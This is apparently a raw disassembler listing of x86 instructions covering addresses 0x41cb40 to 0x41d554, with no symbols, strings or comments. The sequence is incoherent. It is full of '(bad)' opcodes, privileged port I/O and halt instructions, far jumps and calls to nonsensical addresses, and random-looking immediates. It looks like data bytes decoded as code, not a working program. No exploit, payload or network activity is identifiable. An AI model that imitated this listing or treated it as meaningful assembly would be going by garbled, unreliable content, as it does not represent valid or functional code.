  41cb40:	ja     0x41cafd
  41cb42:	sbb    eax,0xcf92d604
  41cb47:	rcr    DWORD PTR [ebp+0x49481eba],0x2e
  41cb4e:	sub    al,0x8a
  41cb50:	mov    esi,DWORD PTR [esi-0x6260d403]
  41cb56:	cmp    ah,cl
  41cb58:	sub    cl,ah
  41cb5a:	mov    al,0x75
  41cb5c:	(bad)  
  41cb5d:	sub    esp,DWORD PTR [ecx]
  41cb5f:	xor    al,0xac
  41cb61:	ror    BYTE PTR [ebx+esi*1-0x2e1635ad],1
  41cb68:	das    
  41cb69:	test   eax,0x5a47acf7
  41cb6e:	pop    esi
  41cb6f:	cmp    esi,DWORD PTR [edi-0x71]
  41cb72:	pop    es
  41cb73:	mov    bl,0x7c
  41cb75:	(bad)  
  41cb76:	push   ecx
  41cb78:	xor    dh,dh
  41cb7a:	pop    edi
  41cb7b:	push   eax
  41cb7c:	push   edi
  41cb7d:	outs   dx,BYTE PTR ds:[esi]
  41cb7e:	faddp  st(3),st
  41cb80:	or     al,0x17
  41cb82:	cmp    ebp,DWORD PTR [ecx]
  41cb84:	test   BYTE PTR [ebp*2+0x7a7411b1],ch
  41cb8b:	cmp    ecx,ebx
  41cb8d:	mov    ebp,0x2e09
	...
  41cbf2:	add    BYTE PTR [eax],al
  41cbf4:	sub    esi,edx
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0x33b57422
  41cc03:	xor    BYTE PTR [ecx+esi*1+0x1],dl
  41cc07:	add    BYTE PTR [ecx+eax*1],al
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	daa    
  41cc0d:	sub    al,0x6a
  41cc0f:	and    BYTE PTR [edi+0x5f],ah
  41cc12:	hlt    
  41cc13:	sbb    ch,BYTE PTR [esi]
  41cc15:	in     eax,dx
  41cc16:	(bad)  
  41cc17:	lahf   
  41cc18:	(bad)  
  41cc19:	(bad)  
  41cc1b:	add    esi,0x3a
  41cc1e:	hlt    
  41cc1f:	shl    DWORD PTR [eax],0xc2
  41cc22:	dec    edx
  41cc23:	fcmovne st,st(4)
  41cc25:	jne    0x41cbac
  41cc27:	sbb    esp,DWORD PTR [ebx]
  41cc29:	push   ebp
  41cc2a:	xlat   BYTE PTR ds:[ebx]
  41cc2b:	or     DWORD PTR [ebp-0x70],0x42
  41cc2f:	ins    DWORD PTR es:[edi],dx
  41cc30:	aad    0x90
  41cc32:	(bad)  
  41cc33:	push   DWORD PTR [esi+0x1edefb4e]
  41cc39:	pop    edi
  41cc3a:	mov    esp,0x21d97585
  41cc3f:	stos   DWORD PTR es:[edi],eax
  41cc40:	add    eax,ebx
  41cc42:	dec    ebp
  41cc43:	sbb    ecx,DWORD PTR [edx]
  41cc45:	in     eax,0xd5
  41cc47:	ins    BYTE PTR es:[edi],dx
  41cc48:	inc    edx
  41cc49:	ds sub ecx,eax
  41cc4c:	sbb    al,0xf3
  41cc4e:	dec    eax
  41cc4f:	clc    
  41cc50:	(bad)  
  41cc51:	vpinsrw xmm4,xmm3,WORD PTR [esi+0x40ebd511],0x73
  41cc5a:	xor    DWORD PTR [edx+ecx*1-0x1a],edx
  41cc5e:	enter  0x8c44,0xc1
  41cc62:	loop   0x41ccdd
  41cc64:	sti    
  41cc65:	dec    ebx
  41cc66:	mov    WORD PTR ds:0xc408e694,?
  41cc6c:	addr16 push 0x25557d19
  41cc72:	arpl   WORD PTR [ecx],di
  41cc74:	dec    ebp
  41cc75:	sahf   
  41cc76:	call   0x92b09501
  41cc7b:	push   edi
  41cc7c:	mov    ds:0xefb05f5,eax
  41cc81:	mov    ah,0xf1
  41cc83:	push   0x15f6b8d5
  41cc88:	ret    
  41cc89:	cmovno ebx,DWORD PTR [ebx+esi*8-0x2cb13490]
  41cc91:	mov    esp,0xade6e80
  41cc96:	sub    eax,DWORD PTR [edx+0x1]
  41cc99:	mov    dl,0xbc
  41cc9b:	call   0xe136:0xeed01ffe
  41cca2:	rcl    DWORD PTR [ebx],cl
  41cca4:	dec    eax
  41cca5:	test   eax,0x6321e5f
  41ccaa:	xor    al,BYTE PTR [ebx-0x4c5f6213]
  41ccb0:	adc    ebp,esi
  41ccb2:	add    al,0x9f
  41ccb4:	sub    esp,0xfdd3d722
  41ccba:	xchg   ebp,eax
  41ccbb:	das    
  41ccbc:	inc    eax
  41ccbd:	ja     0x41cc92
  41ccbf:	dec    ebx
  41ccc0:	or     al,0xf2
  41ccc2:	add    BYTE PTR [edx+ebp*2],ah
  41ccc5:	sub    bl,cl
  41ccc7:	push   0xffffff96
  41ccc9:	xchg   DWORD PTR [ebx-0xa7d308f],ebp
  41cccf:	push   eax
  41ccd0:	mov    ah,0x7e
  41ccd2:	out    dx,al
  41ccd3:	push   edi
  41ccd4:	adc    ah,cl
  41ccd6:	mov    esi,0x285f07ad
  41ccdb:	arpl   WORD PTR [edx-0x252f83e5],si
  41cce1:	pop    esi
  41cce2:	cmp    BYTE PTR [ebx+0x5b],bh
  41cce5:	call   0x2f710db2
  41ccea:	(bad)  
  41cceb:	bound  esi,QWORD PTR [esp+edx*4]
  41ccee:	add    BYTE PTR [esi+0x67cb5843],ch
  41ccf4:	xchg   ebp,eax
  41ccf5:	fcmovne st,st(7)
  41ccf7:	or     DWORD PTR [edi+0x5f8f2663],edx
  41ccfd:	xor    edi,0xffffffe1
  41cd00:	inc    ebx
  41cd01:	nop
  41cd02:	xor    BYTE PTR [ebx],0xc1
  41cd05:	out    0x68,al
  41cd07:	mov    dh,0xde
  41cd09:	adc    eax,0x303b2440
  41cd0e:	mov    cl,0x49
	...
  41cd74:	pusha  
  41cd75:	cdq    
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	clc    
  41cd81:	neg    BYTE PTR [esi]
  41cd83:	adc    ebx,DWORD PTR [eax+0x32]
  41cd86:	add    DWORD PTR [eax],eax
  41cd88:	add    al,0x1
  41cd8a:	add    BYTE PTR [eax],al
  41cd8c:	cmp    BYTE PTR [edi-0x78],al
  41cd8f:	push   cs
  41cd90:	outs   dx,BYTE PTR ds:[esi]
  41cd91:	sub    al,0xa3
  41cd93:	popa   
  41cd94:	xchg   ebp,eax
  41cd95:	(bad)  
  41cd96:	cmp    esp,esi
  41cd98:	aad    0x1
  41cd9a:	jecxz  0x41cd51
  41cd9c:	and    BYTE PTR [ecx-0x214e116],0x34
  41cda3:	ror    DWORD PTR [esi+0x21],1
  41cda6:	adc    DWORD PTR [esi],ebp
  41cda8:	or     eax,0xa3d467d9
  41cdad:	pop    ss
  41cdae:	rcr    BYTE PTR [edx+eiz*8],cl
  41cdb1:	mov    al,0xa8
  41cdb3:	jbe    0x41cd5c
  41cdb5:	jle    0x41cdb7
  41cdb7:	mov    ds:0x96e020e,eax
  41cdbc:	fdivr  QWORD PTR [ebx]
  41cdbe:	inc    ecx
  41cdbf:	mov    eax,0x5d146b9a
  41cdc4:	sbb    eax,edx
  41cdc6:	in     al,dx
  41cdc7:	repz pop edx
  41cdc9:	push   es
  41cdca:	in     eax,dx
  41cdcb:	xchg   esp,eax
  41cdcc:	sbb    DWORD PTR [edx+0x9],eax
  41cdcf:	loop   0x41cd51
  41cdd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdd2:	dec    eax
  41cdd3:	mov    WORD PTR [eax+0x5a87aff1],cs
  41cdd9:	imul   ebp,DWORD PTR [eax],0x16
  41cddc:	mov    dh,0xb0
  41cdde:	cmp    DWORD PTR [esi-0x49d8a8c4],eax
  41cde4:	das    
  41cde5:	mov    bh,0x3f
  41cde7:	or     eax,0xe1b3e9f5
  41cdec:	pop    esi
  41cded:	into   
  41cdee:	push   ebp
  41cdef:	mov    dh,BYTE PTR [edi]
  41cdf1:	sbb    DWORD PTR [ebx-0x2e06b9c0],0x63a73f6c
  41cdfb:	mov    eax,0x71731046
  41ce00:	dec    esp
  41ce01:	push   ecx
  41ce02:	jmp    0x41cdd9
  41ce04:	xchg   ebp,eax
  41ce05:	cmp    eax,0xab9c86ac
  41ce0a:	hlt    
  41ce0b:	jno    0x41ce18
  41ce0d:	push   ss
  41ce0e:	mov    dh,0xf5
  41ce10:	fbstp  TBYTE PTR [ebx-0x23]
  41ce13:	push   ss
  41ce14:	bound  edx,QWORD PTR [eax+0x7b2f62f6]
  41ce1a:	xor    ch,BYTE PTR [ecx]
  41ce1c:	mov    ds:0x38189e30,al
  41ce21:	xor    al,0xa1
  41ce23:	or     eax,0xa84f7ecd
  41ce28:	test   al,0x9a
  41ce2a:	sbb    al,0x9a
  41ce2c:	test   edx,ebx
  41ce2e:	push   esi
  41ce2f:	inc    ebx
  41ce30:	scas   al,BYTE PTR es:[edi]
  41ce31:	pop    ds
  41ce32:	and    DWORD PTR [esi],eax
  41ce34:	repz popf 
  41ce36:	je     0x41ce58
  41ce38:	cmp    eax,0x8b31b959
  41ce3d:	sub    al,0x41
  41ce3f:	scas   al,BYTE PTR es:[edi]
  41ce40:	xchg   ebx,eax
  41ce41:	std    
  41ce42:	mov    edx,DWORD PTR [eax-0x4c1832cf]
  41ce48:	adc    eax,0x1663a717
  41ce4d:	aam    0x82
  41ce4f:	out    dx,eax
  41ce50:	mov    eax,0x3045c1c4
  41ce55:	jmp    0xef7c:0xcacd401b
  41ce5c:	imul   ecx,DWORD PTR [ebx],0xd10a9341
  41ce62:	mov    BYTE PTR [edi-0x4d],bh
  41ce65:	mov    esp,0x1d50c20a
  41ce6a:	aam    0x5c
  41ce6c:	scas   al,BYTE PTR es:[edi]
  41ce6d:	dec    edi
  41ce6e:	or     ebp,DWORD PTR [ebx]
  41ce70:	mov    ecx,0xe6cdb405
  41ce75:	xor    al,0x5a
  41ce77:	mov    ds:0x719928f6,al
  41ce7c:	jb     0x41ce2c
  41ce7e:	sub    BYTE PTR [esi-0x26],ah
  41ce81:	jne    0x41ce22
  41ce83:	inc    esp
  41ce84:	ja     0x41cef2
  41ce86:	add    ebp,esi
  41ce88:	fdivr  st(5),st
  41ce8a:	or     DWORD PTR fs:[ecx+0xd2001e],edi
	...
  41cef1:	add    BYTE PTR [eax],al
  41cef3:	add    BYTE PTR [edi],al
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	loope  0x41ceb8
  41cf02:	mov    es:0x1335c,al
  41cf08:	add    al,0x1
  41cf0a:	add    BYTE PTR [eax],al
  41cf0c:	push   ss
  41cf0d:	in     eax,dx
  41cf0e:	add    dh,al
  41cf10:	jl     0x41ceb6
  41cf12:	mov    esi,esp
  41cf14:	and    eax,ecx
  41cf16:	lea    ebx,[edx-0x2]
  41cf19:	test   DWORD PTR [ebx-0x13],eax
  41cf1c:	xor    BYTE PTR [ecx+0x7bf833a1],dl
  41cf22:	inc    ebx
  41cf23:	outs   dx,BYTE PTR ds:[esi]
  41cf24:	push   esi
  41cf25:	lea    edi,[ecx+ebx*4+0x2a]
  41cf29:	mov    ebp,0xe476c4b0
  41cf2e:	xchg   bl,bh
  41cf30:	aaa    
  41cf31:	jmp    0x41cf36
  41cf33:	mov    esp,0xbc80bb6c
  41cf38:	sub    ebp,esp
  41cf3a:	ror    DWORD PTR [edx+0x7aca6480],cl
  41cf40:	cwde   
  41cf41:	sbb    eax,0x945032bb
  41cf46:	stc    
  41cf47:	lods   eax,DWORD PTR ds:[esi]
  41cf48:	fisub  WORD PTR ds:0xbf5d53cc
  41cf4e:	lock fdivr DWORD PTR [esi*1+0x667dbaab]
  41cf56:	push   ecx
  41cf57:	dec    esp
  41cf58:	xlat   BYTE PTR ss:[ebx]
  41cf5a:	dec    BYTE PTR [esi]
  41cf5c:	pop    ebp
  41cf5d:	dec    eax
  41cf5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf5f:	mov    cl,0x1
  41cf61:	or     eax,ebx
  41cf63:	xchg   ebp,eax
  41cf64:	jns    0x41cf1d
  41cf66:	and    dh,bh
  41cf68:	add    eax,esp
  41cf6a:	sbb    ch,BYTE PTR [ecx+0x40]
  41cf6d:	arpl   WORD PTR [esi+0x465523e6],si
  41cf73:	sub    BYTE PTR [edx-0x7e],cl
  41cf76:	cmp    bl,ah
  41cf78:	(bad)  
  41cf7a:	push   ds
  41cf7b:	mov    ds:0x7ff84bcd,al
  41cf80:	call   0xd9dd21e2
  41cf85:	push   0xffffff8f
  41cf87:	push   es
  41cf88:	push   eax
  41cf89:	sub    DWORD PTR [eax-0x331d57b3],ecx
  41cf8f:	leave  
  41cf90:	js     0x41cfd3
  41cf92:	div    DWORD PTR [ebx]
  41cf94:	pop    esi
  41cf95:	dec    ebp
  41cf96:	aas    
  41cf97:	cs add bh,cl
  41cf9a:	jns    0x41cf4b
  41cf9c:	lahf   
  41cf9d:	test   eax,eax
  41cf9f:	push   ds
  41cfa0:	call   0x9d9a:0xf370950e
  41cfa7:	adc    eax,0xa2b30c92
  41cfac:	xchg   ebx,edx
  41cfae:	repz push ebp
  41cfb0:	jle    0x41cfda
  41cfb2:	jno    0x41cff9
  41cfb4:	test   BYTE PTR [eax-0x2b072fa2],ah
  41cfba:	adc    BYTE PTR [esi],dl
  41cfbc:	dec    eax
  41cfbd:	je     0x41cfe3
  41cfbf:	add    DWORD PTR [esi+0x34],eax
  41cfc2:	mov    al,0x7a
  41cfc4:	mov    edi,0xc21809c0
  41cfc9:	push   0xe28cc2a
  41cfce:	adc    eax,0x79a00c5f
  41cfd3:	push   ebp
  41cfd4:	scas   al,BYTE PTR es:[edi]
  41cfd5:	adc    BYTE PTR ds:0x1eea0e08,dh
  41cfdb:	lahf   
  41cfdc:	push   esi
  41cfdd:	stos   BYTE PTR es:[edi],al
  41cfde:	pop    esi
  41cfdf:	sub    BYTE PTR gs:[edx+0x3c],cl
  41cfe3:	cwde   
  41cfe4:	js     0x41d04b
  41cfe6:	mov    ds:0xba61155,al
  41cfeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfec:	jae    0x41cfc0
  41cfee:	ins    BYTE PTR es:[edi],dx
  41cfef:	pop    es
  41cff0:	std    
  41cff1:	in     al,dx
  41cff2:	fdivr  QWORD PTR [ebx-0x5f]
  41cff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cff6:	and    DWORD PTR [ecx+0x2edd8b7b],edx
  41cffc:	push   ecx
  41cffd:	(bad)  
  41cffe:	jp     0x41d031
  41d000:	mov    ds:0x7452b1ba,eax
  41d005:	aaa    
  41d006:	add    al,0xea
  41d008:	xchg   ebx,eax
  41d009:	ss cli 
  41d00b:	mov    cl,0x6d
  41d00d:	pushf  
  41d00e:	xchg   DWORD PTR [esi+0x0],esi
	...
  41d074:	mov    ecx,0xad432034
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0x14fdb1bd
  41d083:	aas    
  41d084:	pusha  
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR [ecx+eax*1],al
  41d08a:	add    BYTE PTR [eax],al
  41d08c:	push   esi
  41d08d:	sbb    ch,BYTE PTR [esi-0xa]
  41d090:	dec    ecx
  41d091:	pop    ebp
  41d092:	loopne 0x41d016
  41d094:	adc    eax,0xd5e5e133
  41d099:	ja     0x41d073
  41d09b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d09c:	(bad)  
  41d09d:	xor    DWORD PTR [ebx-0xf],esi
  41d0a0:	adc    DWORD PTR [ebp+0x662dd84b],0x72615d3
  41d0aa:	cwde   
  41d0ab:	imul   ebp,DWORD PTR [edi+ebp*8+0x17],0x57198a86
  41d0b3:	mov    ds:0x8e8547b5,al
  41d0b8:	lea    ecx,[eax]
  41d0ba:	fsub   QWORD PTR [eax-0x46]
  41d0bd:	fcom   st(3)
  41d0bf:	shr    DWORD PTR [ebx],cl
  41d0c1:	daa    
  41d0c2:	adc    dl,dh
  41d0c4:	rol    DWORD PTR [ebx],0x47
  41d0c7:	dec    esp
  41d0c8:	pop    ebx
  41d0c9:	shl    BYTE PTR [edx],0xde
  41d0cc:	pop    ebp
  41d0cd:	mov    ecx,0x43a86a65
  41d0d2:	jne    0x41d10e
  41d0d4:	in     al,dx
  41d0d5:	test   al,0xf5
  41d0d7:	sbb    DWORD PTR [eax-0x11a04c3],ecx
  41d0dd:	inc    esi
  41d0de:	jbe    0x41d0a9
  41d0e0:	mov    bh,0x96
  41d0e2:	sub    ecx,esp
  41d0e4:	ins    DWORD PTR es:[edi],dx
  41d0e5:	mov    bl,cl
  41d0e7:	cmc    
  41d0e8:	(bad)  [ebp+0x74]
  41d0eb:	ror    DWORD PTR [edx-0x73],1
  41d0ee:	sub    al,0x57
  41d0f0:	mov    ah,0x1d
  41d0f2:	jb     0x41d0dd
  41d0f4:	mov    ch,0x9d
  41d0f6:	xchg   ebx,eax
  41d0f7:	imul   DWORD PTR [esi+0x8]
  41d0fa:	repz clc 
  41d0fc:	adc    al,0x91
  41d0fe:	sbb    eax,0x6c070df0
  41d103:	push   cs
  41d104:	stos   BYTE PTR es:[edi],al
  41d105:	push   ecx
  41d106:	pop    ss
  41d107:	pop    ecx
  41d108:	lods   eax,DWORD PTR ds:[esi]
  41d109:	push   cs
  41d10a:	mov    dl,BYTE PTR [esi+0x2a8b8571]
  41d110:	push   es
  41d111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d112:	or     al,0xd9
  41d114:	push   cs
  41d115:	push   ebp
  41d116:	and    BYTE PTR [esi],cl
  41d118:	mov    esi,0x25d3ab6
  41d11d:	jno    0x41d101
  41d11f:	adc    eax,0x51f560aa
  41d124:	test   BYTE PTR [esi-0x3ff33007],dh
  41d12a:	xor    esi,eax
  41d12c:	data16 add bl,BYTE PTR [edi-0x1b]
  41d130:	or     al,0x4f
  41d132:	hlt    
  41d133:	mov    edi,0x35c4e0db
  41d138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d139:	mov    esp,cs
  41d13b:	imul   ecx
  41d13d:	xor    DWORD PTR [eax-0x71],0x12
  41d141:	xor    ebx,edi
  41d143:	xor    ch,BYTE PTR [ebx+edx*8-0x74722a14]
  41d14a:	call   0x1519d307
  41d14f:	push   ecx
  41d150:	clc    
  41d151:	and    ebp,DWORD PTR [esi]
  41d153:	fisttp QWORD PTR [esi+0x591d5287]
  41d159:	mov    eax,0x6877bcbe
  41d15e:	mov    dl,0xc7
  41d160:	jecxz  0x41d160
  41d162:	jns    0x41d0ff
  41d164:	xchg   edi,eax
  41d165:	loop   0x41d1a2
  41d167:	mov    edx,0x63b212fd
  41d16c:	mov    ch,0x4a
  41d16e:	pop    es
  41d16f:	outs   dx,DWORD PTR ds:[esi]
  41d170:	cmp    eax,0x80a8d832
  41d175:	jl     0x41d1cd
  41d177:	mov    cl,0xa3
  41d179:	enter  0x4aaa,0x99
  41d17d:	js     0x41d1f5
  41d17f:	push   ds
  41d180:	cmp    eax,0x1be60954
  41d185:	imul   DWORD PTR [edx+0x28]
  41d188:	xchg   edi,eax
  41d189:	mov    esi,ebp
  41d18b:	jecxz  0x41d13b
  41d18d:	xchg   ebx,eax
  41d18e:	xchg   esi,eax
  41d18f:	mov    edx,0x0
	...
  41d1f4:	push   eax
  41d1f5:	ret    
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	mov    ch,0x8a
  41d202:	dec    eax
  41d203:	add    ah,BYTE PTR [ebp+esi*1+0x1]
  41d207:	add    BYTE PTR [ecx+eax*1],al
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	loop   0x41d1d9
  41d20e:	mov    eax,ds:0x6d679900
  41d213:	in     eax,dx
  41d214:	adc    ah,BYTE PTR [edx+edx*4]
  41d217:	adc    eax,0xe47fb3c8
  41d21c:	fcom   DWORD PTR [esi-0x3efd2d3a]
  41d222:	jl     0x41d219
  41d224:	mov    ebx,?
  41d226:	clc    
  41d227:	aad    0xa0
  41d229:	sbb    esp,0x6df8c87a
  41d22f:	cld    
  41d230:	fsubrp st(7),st
  41d232:	int3   
  41d233:	dec    esi
  41d234:	jge    0x41d243
  41d236:	das    
  41d237:	(bad)  
  41d238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d239:	stos   DWORD PTR es:[edi],eax
  41d23a:	or     DWORD PTR [edi+ebp*1],0xffffffd0
  41d23e:	push   es
  41d23f:	xor    eax,0x9f0183f9
  41d244:	sbb    BYTE PTR [esi],bl
  41d246:	xchg   edx,eax
  41d247:	idiv   DWORD PTR [ebp*1-0x92acc93]
  41d24e:	loope  0x41d207
  41d250:	and    DWORD PTR [ecx-0x6e],edi
  41d253:	das    
  41d254:	sbb    eax,0x7ba9b160
  41d259:	dec    edi
  41d25a:	mov    esi,edi
  41d25c:	cld    
  41d25d:	lahf   
  41d25e:	enter  0x13f9,0x78
  41d262:	pop    edi
  41d263:	adc    al,0x4b
  41d265:	popa   
  41d266:	scas   al,BYTE PTR es:[edi]
  41d267:	mov    ds:0x2c10d2d9,al
  41d26c:	loop   0x41d298
  41d26e:	add    DWORD PTR [edx+edi*8+0x32],esp
  41d272:	jno    0x41d2ad
  41d274:	ret    
  41d275:	jb     0x41d20b
  41d277:	and    ax,0xe080
  41d27b:	iret   
  41d27c:	out    dx,al
  41d27d:	aam    0xc4
  41d27f:	div    DWORD PTR [ecx]
  41d281:	add    ch,BYTE PTR [edx-0xf]
  41d284:	mov    eax,0x89ae3208
  41d289:	jo     0x41d2ec
  41d28b:	lods   al,BYTE PTR ds:[esi]
  41d28c:	sbb    BYTE PTR [edx+0x21],dl
  41d28f:	or     eax,0x64006f67
  41d294:	xchg   edx,eax
  41d295:	ror    DWORD PTR [ebp-0x76],1
  41d298:	jmp    0x4740:0xdbeff57
  41d29f:	(bad)  
  41d2a0:	in     al,dx
  41d2a1:	pusha  
  41d2a2:	ja     0x41d2c3
  41d2a4:	ss dec esp
  41d2a6:	das    
  41d2a7:	(bad)  
  41d2a9:	pop    eax
  41d2aa:	or     BYTE PTR [eax-0x4afcfaed],0x2
  41d2b1:	lock bound eax,QWORD PTR [ebx-0x32]
  41d2b5:	pop    ss
  41d2b6:	sbb    DWORD PTR [ebp+0x7e],edi
  41d2b9:	or     al,0xca
  41d2bb:	shl    DWORD PTR [ecx+ebx*1],1
  41d2be:	add    edx,DWORD PTR [edx-0x4a69609c]
  41d2c4:	je     0x41d266
  41d2c6:	sbb    BYTE PTR [edi-0x55],ch
  41d2c9:	inc    esi
  41d2ca:	add    DWORD PTR ds:0x35cafba1,0x60073c3b
  41d2d4:	add    ebx,DWORD PTR [ebp+esi*8-0x6097d93a]
  41d2db:	aaa    
  41d2dc:	xor    al,0x72
  41d2de:	cmp    DWORD PTR [edi-0x5e1514ad],ebx
  41d2e4:	push   edx
  41d2e5:	lods   al,BYTE PTR ds:[esi]
  41d2e6:	in     al,dx
  41d2e7:	test   BYTE PTR [esi-0x42],al
  41d2ea:	and    dh,ch
  41d2ec:	cld    
  41d2ed:	xor    BYTE PTR [ecx-0x12],al
  41d2f0:	sar    DWORD PTR [esi],1
  41d2f2:	fs dec edi
  41d2f4:	push   esi
  41d2f5:	imul   esp,DWORD PTR [edx+0x56],0x6d5a3919
  41d2fc:	popa   
  41d2fd:	mov    eax,ds:0xfa791b2d
  41d302:	int    0x5a
  41d304:	in     eax,0x8d
  41d306:	xor    DWORD PTR [eax+0x24],ebx
  41d309:	ja     0x41d357
  41d30b:	es or  esp,ebx
  41d30e:	xchg   DWORD PTR [eax+eax*1+0x0],ecx
	...
  41d372:	add    BYTE PTR [eax],al
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	aam    0x13
  41d382:	sub    DWORD PTR gs:[eax+0x36],0x1040001
  41d38a:	add    BYTE PTR [eax],al
  41d38c:	gs es popf 
  41d38f:	imul   edx,DWORD PTR fs:[edx],0x7b3d44a3
  41d396:	iret   
  41d397:	jp     0x41d413
  41d399:	add    eax,0x2ea4fdb
  41d39e:	sub    esp,ebx
  41d3a0:	test   BYTE PTR ds:0x58b4d7c3,dh
  41d3a6:	popf   
  41d3a7:	push   eax
  41d3a8:	xchg   edx,eax
  41d3a9:	xchg   ebp,eax
  41d3aa:	js     0x41d37f
  41d3ac:	inc    bh
  41d3ae:	sbb    ebx,DWORD PTR [ecx]
  41d3b0:	inc    eax
  41d3b1:	xor    al,BYTE PTR [esi]
  41d3b3:	loopne 0x41d39c
  41d3b5:	lahf   
  41d3b6:	mov    ecx,DWORD PTR [ecx+0x52d7694a]
  41d3bc:	dec    esp
  41d3bd:	test   BYTE PTR [eax+0x24],cl
  41d3c0:	imul   edi,DWORD PTR [eax+0x74],0xffffffe1
  41d3c4:	sbb    al,BYTE PTR [esi]
  41d3c6:	pop    edx
  41d3c7:	dec    edi
  41d3c8:	push   esi
  41d3c9:	hlt    
  41d3ca:	aas    
  41d3cb:	ret    0x21fe
  41d3ce:	mov    ebp,0x6f46ce5e
  41d3d3:	pushf  
  41d3d4:	xchg   esi,eax
  41d3d5:	xor    ebx,ecx
  41d3d7:	xlat   BYTE PTR ds:[ebx]
  41d3d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3d9:	add    al,0x1c
  41d3db:	cmp    DWORD PTR [edx-0x2c],esi
  41d3de:	add    al,0x59
  41d3e0:	call   FWORD PTR [esp+edi*1-0x69]
  41d3e4:	repz popa 
  41d3e6:	sti    
  41d3e7:	jl     0x41d3bf
  41d3e9:	(bad)  
  41d3ea:	lea    edx,[edi-0x39ffe157]
  41d3f0:	xchg   BYTE PTR ss:[ebx-0x27],bl
  41d3f4:	call   0x193a08ea
  41d3f9:	add    bh,BYTE PTR [edx-0x4382ffdf]
  41d3ff:	jnp    0x41d47f
  41d401:	clc    
  41d402:	test   DWORD PTR [ecx-0x74],ebx
  41d405:	outs   dx,DWORD PTR ds:[esi]
  41d406:	mov    eax,ds:0x704d2ebb
  41d40b:	pop    esi
  41d40c:	sbb    dh,BYTE PTR [ebx-0x29]
  41d40f:	(bad)  [eax+ecx*8-0x7c]
  41d413:	fild   DWORD PTR [eax+eax*2]
  41d416:	loope  0x41d3ac
  41d418:	hlt    
  41d419:	xchg   dh,bh
  41d41b:	jb     0x41d3b0
  41d41d:	cmp    al,0x3e
  41d41f:	out    0xb,eax
  41d421:	push   0x33ce1b8f
  41d426:	cli    
  41d427:	ss cdq 
  41d429:	fisub  WORD PTR [edi+0x4a5a2824]
  41d42f:	pop    edi
  41d430:	cld    
  41d431:	lods   eax,DWORD PTR ds:[esi]
  41d432:	ins    BYTE PTR es:[edi],dx
  41d433:	push   0xdbbb8fbe
  41d438:	mov    eax,ds:0xd066e8ad
  41d43d:	sub    al,0x8f
  41d43f:	js     0x41d4bb
  41d441:	jbe    0x41d45c
  41d443:	call   0x5b674636
  41d448:	mov    bl,0x75
  41d44a:	int3   
  41d44b:	es icebp 
  41d44d:	mov    esi,0xc0d1e91c
  41d452:	adc    BYTE PTR [ecx-0x28],0x30
  41d456:	push   cs
  41d457:	es (bad) 
  41d459:	fidiv  WORD PTR ds:0xbfb6fa71
  41d45f:	add    BYTE PTR [ebx+0x11da9184],bl
  41d465:	and    al,0x5b
  41d467:	inc    esp
  41d468:	adc    eax,0x74e2a8cf
  41d46d:	mov    esp,0x9470d244
  41d472:	les    eax,FWORD PTR [eax+0x45cf794e]
  41d478:	mov    al,ds:0xad30eeb8
  41d47d:	pop    ecx
  41d47e:	clc    
  41d47f:	or     al,0xed
  41d481:	out    dx,al
  41d482:	ret    
  41d483:	fs sti 
  41d485:	mov    edx,0xf8f23abd
  41d48a:	jmp    0x7e09d25
  41d48f:	repz add BYTE PTR [eax],al
	...
  41d4f2:	add    BYTE PTR [eax],al
  41d4f4:	div    BYTE PTR [esi]
  41d4f6:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0x6c07:0x236fa889
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    al,0x1
  41d50a:	add    BYTE PTR [eax],al
  41d50c:	int3   
  41d50d:	adc    dh,dh
  41d50f:	sbb    DWORD PTR [ecx],edx
  41d511:	add    BYTE PTR [esi+0x8],ah
  41d514:	fmul   st(3),st
  41d516:	in     eax,0x83
  41d518:	inc    esi
  41d519:	ins    BYTE PTR es:[edi],dx
  41d51a:	sub    BYTE PTR [esi-0x2a9eb0da],bl
  41d520:	in     eax,0xb4
  41d522:	add    BYTE PTR [eax+0xb],bh
  41d525:	or     al,0x7e
  41d527:	repnz cdq 
  41d529:	xchg   ecx,eax
  41d52a:	fs cmp dh,cl
  41d52d:	mov    esi,0xf757e635
  41d532:	lods   al,BYTE PTR ds:[si]
  41d534:	rol    esp,1
  41d536:	add    cl,BYTE PTR [esi-0x79]
  41d539:	and    BYTE PTR [edx-0x61481096],dl
  41d53f:	(bad)  
  41d540:	clc    
  41d541:	mov    dh,BYTE PTR [ebx]
  41d543:	mov    ch,0xc3
  41d545:	js     0x41d54d
  41d547:	push   ecx
  41d548:	pop    ebp
  41d549:	arpl   WORD PTR [edi+0x5b5e396b],di
  41d54f:	ja     0x41d547
  41d551:	ficom  WORD PTR [edx+0x5]
  41d554:	inc    ebp
